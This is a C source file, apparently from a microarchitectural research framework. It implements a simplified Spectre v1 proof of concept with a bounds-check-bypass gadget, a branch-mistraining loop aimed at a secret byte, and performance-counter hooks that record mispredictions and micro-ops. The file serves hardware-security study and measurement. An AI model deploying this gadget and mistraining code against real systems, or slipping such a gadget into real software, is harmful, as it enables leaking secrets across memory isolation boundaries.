/* Simplified Spectre PoC: Stage1 + Stage2 + UOPS measurement */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#define NOP_REGION_BEGIN asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END   asm volatile("# NOP_REGION_END");

/********************************************************************
 Victim data
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,  2,  3,  4,
    5,  6,  7,  8,
    9, 10, 11, 12,
    13, 14, 15, 16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

uint8_t g_secret_value = 'Y';
char *secret = (char *)&g_secret_value;
uint8_t temp = 0;

/* Stage1 PMU 接口 (现有) */
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

/* UOPS 测量接口 (新增) */
extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/********************************************************************
 Stage 2: Gadget (victim function)
 添加 UOPS snap_before / snap_after 调用
********************************************************************/
__attribute__((noinline))
void spectre_function(size_t x) {

  pmu_uops_snap_before();

  asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");
  if (x < array1_size) {
    NOP_REGION_BEGIN
    temp &= array2[array1[x] * 512];
    NOP_REGION_END
  }
  asm volatile(".globl STAGE1_END\nSTAGE1_END:");

  pmu_uops_snap_after();
}

/********************************************************************
 Framework interfaces
********************************************************************/
void vf_set_secret(uint8_t s) {
    g_secret_value = s;
}

volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
    return &array2[(size_t)s * 512];
}

/********************************************************************
 Stage 1: Mistrain + Trigger
********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x) {
    int j;
    size_t training_x, x;

    for (j = 29; j >= 0; j--) {
        training_x = (size_t)(j % 16);
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 200; z++) {}

        x = ((j % 6) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = training_x ^ (x & (malicious_x ^ training_x));

        spectre_function(x);
    }
}

void vf_run_attack_once(void) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    stage1_mistrain_trigger(malicious_x);
}

void vf_prepare_probe_region(int candidate_count) {
    if (candidate_count <= 0 || candidate_count > 256) {
        candidate_count = 256;
    }
    for (int i = 0; i < candidate_count; i++) {
        volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
        *p = 1;
    }
}

/********************************************************************
 main
********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int i;

    /* 初始化 array2 */
    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }

    /* 执行阶段1 */
    stage1_mistrain_trigger(malicious_x);

    /* Stage1 BR_MISP 数据 */
    {
        int n = pmu_stage1_get_count();
        for (i = 0; i < n; i++) {
            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
                   i,
                   (unsigned long long)pmu_stage1_get_delta(i));
        }
    }

    /* UOPS 数据 */
    pmu_uops_print_results();

    return 0;
}
#endif